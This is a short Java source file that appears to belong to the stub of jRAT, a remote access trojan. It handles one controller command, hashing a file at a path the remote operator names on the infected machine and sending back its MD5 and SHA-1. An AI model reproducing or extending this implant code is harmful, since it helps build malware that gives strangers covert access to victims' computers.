package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.hash.Md5;
import se.jrat.common.hash.Sha1;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet46FileHash;


public class Packet64FileHash extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.instance.readLine();

		File file = new File(path);
		
		Sha1 sha1 = new Sha1();
		Md5 md5 = new Md5();

		String smd5 = md5.hash(file);
		String ssha1 = sha1.hash(file);

		System.gc();

		Connection.instance.addToSendQueue(new Packet46FileHash(smd5, ssha1));
	}

}
